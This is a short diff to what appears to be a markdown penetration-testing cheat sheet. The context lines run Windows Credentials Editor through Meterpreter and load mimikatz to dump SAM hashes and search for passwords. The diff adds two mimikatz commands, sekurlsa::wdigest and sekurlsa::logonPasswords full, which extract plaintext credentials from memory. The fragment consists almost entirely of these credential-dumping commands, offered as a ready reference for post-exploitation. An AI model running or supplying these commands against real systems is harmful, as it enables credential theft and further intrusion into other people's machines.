@@ -153,7 +153,9 @@ execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
 load mimikatz
 mimikatz_command -f version
 mimikatz_command -f samdump::hashes
+mimikatz_command -f sekurlsa::wdigest
 mimikatz_command -f sekurlsa::searchPasswords
+mimikatz_command -f sekurlsa::logonPasswords full
 ```
 
 ```powershell
